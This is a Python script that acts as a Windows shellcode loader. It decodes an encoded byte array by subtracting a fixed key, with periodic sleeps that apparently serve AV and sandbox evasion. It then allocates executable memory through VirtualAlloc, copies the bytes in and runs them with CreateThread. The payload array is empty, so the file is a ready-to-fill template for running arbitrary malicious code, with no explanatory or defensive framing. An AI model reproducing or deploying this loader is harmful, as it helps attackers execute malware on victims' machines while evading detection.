import ctypes
import time
import random
lShellcode = []
magic = 0x77
shellcode =[]
table = random.sample(range(0,len(shellcode)),len(shellcode))

for i in range(len(shellcode)):
    if i % 1000 == 0:
        time.sleep(1)
        #print("sleep")
    shellcode[i] -= magic
shellcode = bytearray(shellcode)
for i in range(len(shellcode)):
    lShellcode.append(shellcode[i])

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr0 = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  
    ctypes.c_int(len(shellcode)*2),  
    ctypes.c_int(0x3000),  
    ctypes.c_int(0x40),  
)
ctypes.windll.kernel32.HeapAlloc.restype = ctypes.c_uint64
ctypes.windll.kernel32.HeapCreate.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x40000),
                                          ctypes.c_int(0),ctypes.c_int(0))
ptr2 = ctypes.windll.kernel32.HeapAlloc(ctypes.c_void_p(ptr),ctypes.c_int(0),ctypes.c_int(0x40000))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.memmove(ctypes.c_void_p(ptr0),buf,ctypes.c_size_t(len(shellcode)))
 
#print("load")

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)),  
    ctypes.c_int(0),  
    ctypes.c_void_p(ptr0),  
    ctypes.pointer(ctypes.c_int(0)),  
    ctypes.c_int(0),  
    ctypes.pointer(ctypes.c_int(0))  
)
#print(handle)
#print("exit")
ret = ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
#print(ret)
